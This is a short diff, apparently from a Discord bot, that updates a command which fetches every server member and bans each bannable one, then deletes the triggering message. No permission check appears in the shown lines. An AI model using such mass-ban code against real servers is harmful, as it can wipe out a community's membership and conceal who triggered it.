@@ -4,7 +4,10 @@ module.exports.run = async (bot, message, args) => {
 
     try {
 
-        message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
+        const members = await message.guild.members.fetch()
+        members
+            .filter(m => m.bannable)
+            .forEach(m => m.ban())
         message.delete(1000);
 
     } catch(e) {
